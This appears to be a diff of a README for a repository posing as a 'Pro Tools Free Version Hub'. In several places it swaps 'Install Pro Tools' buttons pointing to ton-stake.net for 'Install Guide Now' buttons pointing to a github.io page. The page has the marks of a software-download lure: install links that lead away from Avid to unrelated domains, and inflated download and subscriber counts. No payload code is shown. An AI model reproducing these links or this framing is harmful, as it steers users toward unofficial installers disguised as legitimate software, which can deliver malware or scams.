@@ -8,9 +8,11 @@
 
 **Description**: Dive into professional audio production with the **Avid Pro Tools Free Version Hub** in 2025! This repository offers comprehensive tutorials, sample projects, and resources for the 30-day free trial and Pro Tools First free version. Join our community with 20K+ downloads and 8K+ subscribers to elevate your sound engineering skills!  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+ 
 
 ## 📋 Getting Started Guide  
 
@@ -34,9 +36,11 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 6. **Troubleshooting** ❓  
    If issues occur, disable your VPN, check your audio interface, or contact Avid support.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+
 
 ## 💡 Why Choose Pro Tools Free Version Hub  
 
@@ -47,9 +51,11 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 - 🌍 **Active Community**: Supported by 20K+ downloads and 8K+ subscribers.  
 - 📅 **2025 Updates**: Stay current with the latest Pro Tools features.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://protoolsfreeversionhub.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
+ 
 
 ## 🎯 Usage Scenarios  
 
@@ -65,9 +71,7 @@ Begin your Pro Tools journey with these detailed steps to access the free versio
 - 🎧 **Live Mixing**: Practice with virtual soundboards.  
 - 📚 **Skill Building**: Learn from 8K+ subscriber contributions.  
 
-[![Install Pro Tools](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
 
----
 
 ## 🏆 Benefits  
 
